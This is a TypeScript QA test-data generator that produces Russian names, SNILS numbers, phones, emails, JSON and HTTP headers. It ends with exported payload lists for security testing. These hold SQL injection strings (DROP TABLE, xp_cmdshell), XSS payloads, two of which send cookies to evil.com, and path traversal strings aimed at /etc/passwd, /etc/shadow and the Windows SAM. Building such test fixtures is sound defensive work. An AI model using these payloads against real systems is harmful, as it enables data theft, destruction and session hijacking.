const maleFirstNames = [
  "Александр", "Дмитрий", "Максим", "Сергей", "Андрей", "Алексей", "Артём",
  "Илья", "Кирилл", "Михаил", "Никита", "Матвей", "Роман", "Егор", "Арсений",
  "Иван", "Денис", "Евгений", "Даниил", "Тимофей", "Владислав", "Игорь",
  "Владимир", "Павел", "Руслан", "Марк", "Константин", "Тимур", "Олег", "Ярослав",
];

const femaleFirstNames = [
  "Анастасия", "Мария", "Анна", "Виктория", "Екатерина", "Наталья", "Марина",
  "Ольга", "Татьяна", "Юлия", "Ирина", "Дарья", "Елена", "Алина", "Ксения",
  "Полина", "Валерия", "София", "Александра", "Светлана", "Кристина", "Вероника",
  "Диана", "Надежда", "Людмила", "Карина", "Алёна", "Евгения", "Лариса", "Оксана",
];

const maleLastNames = [
  "Иванов", "Петров", "Сидоров", "Козлов", "Новиков", "Морозов", "Волков",
  "Соколов", "Лебедев", "Кузнецов", "Попов", "Смирнов", "Васильев", "Павлов",
  "Семёнов", "Голубев", "Виноградов", "Богданов", "Воробьёв", "Фёдоров",
];

const femaleLastNames = [
  "Иванова", "Петрова", "Сидорова", "Козлова", "Новикова", "Морозова", "Волкова",
  "Соколова", "Лебедева", "Кузнецова", "Попова", "Смирнова", "Васильева", "Павлова",
  "Семёнова", "Голубева", "Виноградова", "Богданова", "Воробьёва", "Фёдорова",
];

const malePatronymics = [
  "Александрович", "Дмитриевич", "Сергеевич", "Андреевич", "Алексеевич",
  "Михайлович", "Иванович", "Николаевич", "Владимирович", "Павлович",
  "Олегович", "Евгеньевич", "Романович", "Игоревич", "Артёмович",
];

const femalePatronymics = [
  "Александровна", "Дмитриевна", "Сергеевна", "Андреевна", "Алексеевна",
  "Михайловна", "Ивановна", "Николаевна", "Владимировна", "Павловна",
  "Олеговна", "Евгеньевна", "Романовна", "Игоревна", "Артёмовна",
];

function randomItem<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)];
}

function randomInt(min: number, max: number): number {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

const rareMaleFirstNames = [
  "Всеволод", "Святослав", "Вячеслав", "Феофан", "Мирослав", "Ростислав",
  "Богдан", "Добромир", "Лаврентий", "Ефим", "Герасим", "Феликс",
  "Аристарх", "Никифор", "Прокофий", "Венедикт", "Онуфрий", "Захарий",
];

const rareFemaleFirstNames = [
  "Мирослава", "Святослава", "Феодосия", "Варвара", "Агафья", "Прасковья",
  "Таисия", "Нинель", "Аглая", "Серафима", "Ефросиния", "Глафира",
  "Пелагея", "Зинаида", "Анфиса", "Капитолина", "Нонна", "Евдокия",
];

const doubleSurnamePartsMale = [
  "Иванов", "Петров", "Козлов", "Волков", "Морозов", "Громов", "Орлов",
  "Медведев", "Соловьёв", "Журавлёв", "Воронов", "Лисицын", "Зайцев",
];

const doubleSurnamePartsFemale = [
  "Иванова", "Петрова", "Козлова", "Волкова", "Морозова", "Громова", "Орлова",
  "Медведева", "Соловьёва", "Журавлёва", "Воронова", "Лисицына", "Зайцева",
];

const foreignLastNamesMale = [
  "Аль-Рашид", "Де Ла Круз", "Ван Дер Берг", "О'Брайен", "Мак-Дугалл",
  "Ибн Сина", "Фон Штауфен", "Де Монферран", "Аль-Хасан", "Чжан Вэй",
];

const foreignLastNamesFemale = [
  "Аль-Рашид", "Де Ла Круз", "Ван Дер Берг", "О'Брайен", "Мак-Дугалл",
  "Фон Штауфен", "Де Монферран", "Аль-Хасан",
];

export type FioComplexity = "normal" | "double_surname" | "rare_name" | "foreign" | "complex";

export function generateFIO(gender: "male" | "female" | "random", complexity: FioComplexity = "normal"): string {
  const g = gender === "random" ? (Math.random() > 0.5 ? "male" : "female") : gender;

  if (complexity === "double_surname") {
    const parts = g === "male" ? doubleSurnamePartsMale : doubleSurnamePartsFemale;
    const lastName = `${randomItem(parts)}-${randomItem(parts)}`;
    return g === "male"
      ? `${lastName} ${randomItem(maleFirstNames)} ${randomItem(malePatronymics)}`
      : `${lastName} ${randomItem(femaleFirstNames)} ${randomItem(femalePatronymics)}`;
  }

  if (complexity === "rare_name") {
    return g === "male"
      ? `${randomItem(maleLastNames)} ${randomItem(rareMaleFirstNames)} ${randomItem(malePatronymics)}`
      : `${randomItem(femaleLastNames)} ${randomItem(rareFemaleFirstNames)} ${randomItem(femalePatronymics)}`;
  }

  if (complexity === "foreign") {
    const foreignLN = g === "male" ? randomItem(foreignLastNamesMale) : randomItem(foreignLastNamesFemale);
    return g === "male"
      ? `${foreignLN} ${randomItem(rareMaleFirstNames)} ${randomItem(malePatronymics)}`
      : `${foreignLN} ${randomItem(rareFemaleFirstNames)} ${randomItem(femalePatronymics)}`;
  }

  if (complexity === "complex") {
    const maleParts = doubleSurnamePartsMale;
    const femaleParts = doubleSurnamePartsFemale;
    const lastName = g === "male"
      ? `${randomItem(maleParts)}-${randomItem(maleParts)}`
      : `${randomItem(femaleParts)}-${randomItem(femaleParts)}`;
    return g === "male"
      ? `${lastName} ${randomItem(rareMaleFirstNames)} ${randomItem(malePatronymics)}`
      : `${lastName} ${randomItem(rareFemaleFirstNames)} ${randomItem(femalePatronymics)}`;
  }

  if (g === "male") {
    return `${randomItem(maleLastNames)} ${randomItem(maleFirstNames)} ${randomItem(malePatronymics)}`;
  }
  return `${randomItem(femaleLastNames)} ${randomItem(femaleFirstNames)} ${randomItem(femalePatronymics)}`;
}

export function generateSNILS(valid: boolean): string {
  if (!valid) {
    const digits = Array.from({ length: 9 }, () => randomInt(0, 9));
    const wrongChecksum = randomInt(0, 99);
    const num = digits.join("");
    const cs = wrongChecksum.toString().padStart(2, "0");
    return `${num.slice(0, 3)}-${num.slice(3, 6)}-${num.slice(6, 9)} ${cs}`;
  }

  const digits = Array.from({ length: 9 }, () => randomInt(0, 9));
  let sum = 0;
  for (let i = 0; i < 9; i++) {
    sum += digits[i] * (9 - i);
  }
  let checksum = sum % 101;
  if (checksum === 100) checksum = 0;

  const num = digits.join("");
  const cs = checksum.toString().padStart(2, "0");
  return `${num.slice(0, 3)}-${num.slice(3, 6)}-${num.slice(6, 9)} ${cs}`;
}

export function generateBirthDate(boundary: boolean): string {
  if (boundary) {
    const boundaries = [
      new Date(1900, 0, 1),
      new Date(2000, 0, 1),
      new Date(2000, 1, 29),
      new Date(1999, 11, 31),
      new Date(new Date().getFullYear() - 18, new Date().getMonth(), new Date().getDate()),
      new Date(),
    ];
    const d = randomItem(boundaries);
    return d.toISOString().split("T")[0];
  }
  const year = randomInt(1950, 2005);
  const month = randomInt(0, 11);
  const day = randomInt(1, 28);
  const d = new Date(year, month, day);
  return d.toISOString().split("T")[0];
}

export function generatePhone(format: "ru" | "international"): string {
  if (format === "ru") {
    const code = randomItem(["900", "901", "902", "903", "904", "905", "906", "910", "911", "912", "915", "916", "917", "918", "920", "921", "922", "925", "926", "927", "928", "929", "930", "931", "932", "933", "934", "936", "937", "938", "939", "950", "951", "952", "953", "958", "960", "961", "962", "963", "964", "965", "966", "967", "968", "969", "977", "978", "980", "981", "982", "983", "984", "985", "986", "987", "988", "989", "991", "992", "993", "994", "995", "996", "997", "999"]);
    const num = Array.from({ length: 7 }, () => randomInt(0, 9)).join("");
    return `+7 (${code}) ${num.slice(0, 3)}-${num.slice(3, 5)}-${num.slice(5)}`;
  }
  const countryCodes = ["+1", "+44", "+49", "+33", "+81", "+86", "+91", "+55", "+61", "+34"];
  const cc = randomItem(countryCodes);
  const num = Array.from({ length: 10 }, () => randomInt(0, 9)).join("");
  return `${cc} ${num.slice(0, 3)} ${num.slice(3, 6)} ${num.slice(6)}`;
}

export function generateEmail(valid: boolean): string {
  const names = ["test", "user", "admin", "john", "jane", "qa", "dev", "info", "support", "contact"];
  const domains = ["example.com", "test.org", "mail.ru", "gmail.com", "yandex.ru", "company.co"];

  if (valid) {
    const name = randomItem(names) + randomInt(1, 999);
    return `${name}@${randomItem(domains)}`;
  }
  const invalidEmails = [
    "user@",
    "@domain.com",
    "user@.com",
    "user@domain",
    "user domain@com",
    "user@@domain.com",
    ".user@domain.com",
    "user.@domain.com",
    "user@domain..com",
    "user@-domain.com",
    "",
    "   ",
    "user@domain.c",
  ];
  return randomItem(invalidEmails);
}

export function generateUUID(): string {
  return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (c) => {
    const r = (Math.random() * 16) | 0;
    const v = c === "x" ? r : (r & 0x3) | 0x8;
    return v.toString(16);
  });
}

export function generateRandomId(length: number = 16): string {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
}

const cyrillicChars = "АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдеёжзийклмнопрстуфхцчшщъыьэюя";
const latinChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
const digitChars = "0123456789";
const specialChars = "!@#$%^&*()_+-=[]{}|;':\",./<>?`~\\";
const emojiChars = "😀😃😄😁😆😅🤣😂🙂🙃😉😊😇🥰😍🤩😘😗😚😙🥲😋😛😜🤪😝🤑🤗🤭🤫🤔🫡🫢🫣🤐🤨😐😑😶🫥😏😒🙄😬🤥🌚🫠😌😔😪🤤😴😷🤒🤕🤢🤮🤧🥵🥶🥴😵🤯🤠🥳🥸😎🤓🧐😕🫤😟🙁😮😯😲😳🥺🥹😦😧😨😰😥😢😭😱😖😣😞😓😩😫🥱😤😡😠🤬😈👿💀";

const meaningfulWordsRU = [
  "система", "пользователь", "данные", "запрос", "ответ", "сервер", "клиент", "база", "файл", "документ",
  "проверка", "тестирование", "результат", "ошибка", "успех", "процесс", "задача", "проект", "команда", "работа",
  "время", "дата", "номер", "адрес", "имя", "фамилия", "город", "страна", "компания", "отдел",
  "качество", "контроль", "анализ", "отчёт", "версия", "обновление", "настройка", "параметр", "значение", "статус",
  "приложение", "интерфейс", "модуль", "функция", "метод", "объект", "класс", "таблица", "список", "элемент",
  "безопасность", "доступ", "авторизация", "аутентификация", "токен", "сессия", "роль", "разрешение", "профиль", "аккаунт",
  "сообщение", "уведомление", "событие", "журнал", "лог", "история", "архив", "резервная", "копия", "восстановление",
  "поиск", "фильтр", "сортировка", "группировка", "выборка", "экспорт", "импорт", "загрузка", "выгрузка", "синхронизация",
  "новый", "старый", "текущий", "основной", "дополнительный", "важный", "критический", "минимальный", "максимальный", "средний",
  "создать", "удалить", "изменить", "обновить", "сохранить", "отправить", "получить", "подтвердить", "отменить", "завершить",
];

const meaningfulWordsEN = [
  "system", "user", "data", "request", "response", "server", "client", "database", "file", "document",
  "validation", "testing", "result", "error", "success", "process", "task", "project", "team", "work",
  "time", "date", "number", "address", "name", "surname", "city", "country", "company", "department",
  "quality", "control", "analysis", "report", "version", "update", "settings", "parameter", "value", "status",
  "application", "interface", "module", "function", "method", "object", "class", "table", "list", "element",
  "security", "access", "authorization", "authentication", "token", "session", "role", "permission", "profile", "account",
  "message", "notification", "event", "journal", "log", "history", "archive", "backup", "copy", "recovery",
  "search", "filter", "sorting", "grouping", "selection", "export", "import", "upload", "download", "sync",
  "new", "old", "current", "primary", "additional", "important", "critical", "minimum", "maximum", "average",
  "create", "delete", "modify", "update", "save", "send", "receive", "confirm", "cancel", "complete",
];

function generateMeaningfulText(length: number, lang: "ru" | "en"): string {
  const words = lang === "ru" ? meaningfulWordsRU : meaningfulWordsEN;
  let result = "";
  let sentenceLen = 0;
  const targetSentenceWords = () => 5 + Math.floor(Math.random() * 8);
  let wordsInSentence = targetSentenceWords();

  while (result.length < length) {
    const word = words[Math.floor(Math.random() * words.length)];
    const capitalize = sentenceLen === 0;
    const addWord = capitalize ? word.charAt(0).toUpperCase() + word.slice(1) : word;

    if (result.length === 0) {
      result = addWord;
    } else {
      result += " " + addWord;
    }

    sentenceLen++;

    if (sentenceLen >= wordsInSentence) {
      result += ".";
      sentenceLen = 0;
      wordsInSentence = targetSentenceWords();
    }
  }

  if (sentenceLen > 0 && !result.endsWith(".")) {
    result = result.substring(0, length - 1) + ".";
  }

  return result.substring(0, length);
}

export type TextType = "cyrillic" | "latin" | "digits" | "special" | "mixed" | "meaningful_ru" | "meaningful_en";

export function generateText(length: number, type: TextType): string {
  if (type === "meaningful_ru") return generateMeaningfulText(length, "ru");
  if (type === "meaningful_en") return generateMeaningfulText(length, "en");

  let pool = "";
  switch (type) {
    case "cyrillic": pool = cyrillicChars; break;
    case "latin": pool = latinChars; break;
    case "digits": pool = digitChars; break;
    case "special": pool = specialChars; break;
    case "mixed": pool = cyrillicChars + latinChars + digitChars + specialChars; break;
  }
  return Array.from({ length }, () => pool[Math.floor(Math.random() * pool.length)]).join("");
}

const loremRU = "Далеко-далеко за словесными горами в стране гласных и согласных живут рыбные тексты. Вдали от всех живут они в буквенных домах на берегу Семантика большого языкового океана. Маленький ручеёк Даль журчит по всей стране и обеспечивает её всеми необходимыми правилами. Эта парадигматическая страна в которой жаренные части предложения залетают прямо в рот. Даже всемогущая пунктуация не имеет власти над рыбными текстами ведущими безорфографичный образ жизни. Однажды одна маленькая строчка рыбного текста по имени Lorem ipsum решила выйти в большой мир грамматики. Великий Оксмокс предупредил её о злых запятых диких знаках вопроса и коварных точках с запятой но текст не дал сбить себя с толку.";

const loremEN = "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum. Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo.";

export function generateLorem(lang: "ru" | "en", paragraphs: number): string {
  const src = lang === "ru" ? loremRU : loremEN;
  return Array.from({ length: paragraphs }, () => src).join("\n\n");
}

export function generateUnicodeText(length: number): string {
  const pool = Array.from(emojiChars);
  return Array.from({ length }, () => pool[Math.floor(Math.random() * pool.length)]).join("");
}

export const sqlInjectionPayloads = [
  "' OR '1'='1",
  "' OR '1'='1' --",
  "' OR '1'='1' /*",
  "'; DROP TABLE users; --",
  "' UNION SELECT NULL, NULL, NULL --",
  "1' ORDER BY 1--+",
  "1' ORDER BY 2--+",
  "' UNION SELECT username, password FROM users --",
  "admin'--",
  "1; UPDATE users SET password='hacked' WHERE username='admin'--",
  "' AND 1=1 --",
  "' AND 1=2 --",
  "1' AND (SELECT COUNT(*) FROM users) > 0 --",
  "'; EXEC xp_cmdshell('whoami'); --",
  "' OR EXISTS(SELECT * FROM users WHERE username='admin') --",
  "1'; WAITFOR DELAY '0:0:5'; --",
  "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--",
  "') OR ('1'='1",
  "' OR 1=1 LIMIT 1 --",
  "' AND SLEEP(5) --",
];

export const xssPayloads = [
  "<script>alert('XSS')</script>",
  "<img src=x onerror=alert('XSS')>",
  "<svg onload=alert('XSS')>",
  "javascript:alert('XSS')",
  "<body onload=alert('XSS')>",
  "<iframe src=\"javascript:alert('XSS')\">",
  "'><script>alert(document.cookie)</script>",
  "\"><img src=x onerror=alert('XSS')>",
  "<input onfocus=alert('XSS') autofocus>",
  "<marquee onstart=alert('XSS')>",
  "<details open ontoggle=alert('XSS')>",
  "<div onmouseover=alert('XSS')>hover me</div>",
  "'-alert('XSS')-'",
  "<script>fetch('https://evil.com?c='+document.cookie)</script>",
  "<img src=\"\" onerror=\"this.src='https://evil.com/?c='+document.cookie\">",
  "{{constructor.constructor('return this')().alert('XSS')}}",
  "${alert('XSS')}",
  "<a href=\"javascript:alert('XSS')\">click me</a>",
  "<form action=\"javascript:alert('XSS')\"><input type=submit>",
  "<base href=\"javascript:alert('XSS')//\">",
];

export const pathTraversalPayloads = [
  "../",
  "../../",
  "../../../etc/passwd",
  "..\\..\\..\\windows\\system32\\config\\sam",
  "%2e%2e%2f",
  "%2e%2e/",
  "..%2f",
  "%2e%2e%5c",
  "....//",
  "..%252f",
  "/etc/passwd",
  "/etc/shadow",
  "C:\\Windows\\System32\\drivers\\etc\\hosts",
  "....\\\\",
  "..%c0%af",
  "..%ef%bc%8f",
  "/proc/self/environ",
  "../../../../../../etc/passwd%00.jpg",
  "..\\..\\..\\..\\..\\..\\windows\\win.ini",
  "file:///etc/passwd",
];

export const nullEmptyPayloads = [
  "",
  " ",
  "null",
  "undefined",
  "NaN",
  "None",
  "nil",
  "0",
  "-1",
  "false",
  "[]",
  "{}",
  '""',
  "''",
  "\\0",
  "\\n",
  "\\r\\n",
  "\\t",
  "true",
  "-0",
];

export function generateLongString(length: number): string {
  const char = "A";
  return char.repeat(length);
}

export function generateJSON(type: "valid" | "invalid" | "nested"): string {
  if (type === "valid") {
    return JSON.stringify({
      id: randomInt(1, 1000),
      name: generateFIO("random"),
      email: generateEmail(true),
      phone: generatePhone("ru"),
      active: Math.random() > 0.5,
      role: randomItem(["admin", "user", "moderator", "editor"]),
      createdAt: new Date().toISOString(),
    }, null, 2);
  }

  if (type === "invalid") {
    const invalidJsons = [
      '{"name": "test",}',
      "{'name': 'test'}",
      '{name: "test"}',
      '{"name": undefined}',
      '{"name": }',
      "[1, 2, 3,]",
      '{"key": "value"',
      '"just a string"',
      "null",
      "{\"key\": NaN}",
    ];
    return randomItem(invalidJsons);
  }

  return JSON.stringify({
    user: {
      id: randomInt(1, 1000),
      profile: {
        firstName: randomItem(maleFirstNames),
        lastName: randomItem(maleLastNames),
        contacts: {
          email: generateEmail(true),
          phones: [generatePhone("ru"), generatePhone("international")],
          address: {
            city: randomItem(["Москва", "Санкт-Петербург", "Новосибирск", "Екатеринбург"]),
            street: "ул. Тестовая, д. " + randomInt(1, 100),
            zip: String(randomInt(100000, 999999)),
          },
        },
      },
      settings: {
        theme: randomItem(["light", "dark"]),
        notifications: {
          email: Math.random() > 0.5,
          sms: Math.random() > 0.5,
          push: Math.random() > 0.5,
        },
        language: randomItem(["ru", "en", "de"]),
      },
    },
    metadata: {
      version: "1.0.0",
      timestamp: new Date().toISOString(),
    },
  }, null, 2);
}

export function generateHTTPHeaders(type: "authorization" | "cookies" | "custom"): string {
  if (type === "authorization") {
    const types = [
      `Bearer ${generateRandomId(64)}`,
      `Basic ${btoa(`user${randomInt(1, 100)}:password${randomInt(1, 100)}`)}`,
      `Token ${generateRandomId(40)}`,
      `ApiKey ${generateRandomId(32)}`,
      `Digest username="admin", realm="test", nonce="${generateRandomId(32)}"`,
    ];
    return randomItem(types);
  }

  if (type === "cookies") {
    const cookies = [
      `session_id=${generateRandomId(32)}; Path=/; HttpOnly; Secure; SameSite=Strict`,
      `csrf_token=${generateRandomId(64)}; Path=/; Secure`,
      `user_pref=theme:dark; Path=/; Max-Age=86400`,
      `auth_token=${generateRandomId(48)}; Domain=.example.com; Path=/; HttpOnly`,
      `tracking_id=${generateUUID()}; Path=/; Expires=${new Date(Date.now() + 86400000).toUTCString()}`,
    ];
    return randomItem(cookies);
  }

  const headers: Record<string, string> = {
    "X-Request-ID": generateUUID(),
    "X-Correlation-ID": generateUUID(),
    "X-Forwarded-For": `${randomInt(1, 255)}.${randomInt(0, 255)}.${randomInt(0, 255)}.${randomInt(0, 255)}`,
    "X-Real-IP": `${randomInt(1, 255)}.${randomInt(0, 255)}.${randomInt(0, 255)}.${randomInt(0, 255)}`,
    "Accept-Language": randomItem(["ru-RU,ru;q=0.9,en-US;q=0.8", "en-US,en;q=0.9", "de-DE,de;q=0.9,en;q=0.8"]),
    "User-Agent": randomItem([
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
      "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    ]),
    "Cache-Control": randomItem(["no-cache", "no-store", "max-age=3600", "public, max-age=86400"]),
    "Content-Type": randomItem(["application/json", "text/html", "multipart/form-data", "application/xml"]),
  };
  return JSON.stringify(headers, null, 2);
}

export function exportToCSV(data: string[], headers?: string[]): string {
  const lines: string[] = [];
  if (headers) {
    lines.push(headers.join(","));
  }
  data.forEach((item) => {
    lines.push(`"${item.replace(/"/g, '""')}"`);
  });
  return lines.join("\n");
}

export function exportToJSON(data: string[]): string {
  return JSON.stringify(data, null, 2);
}
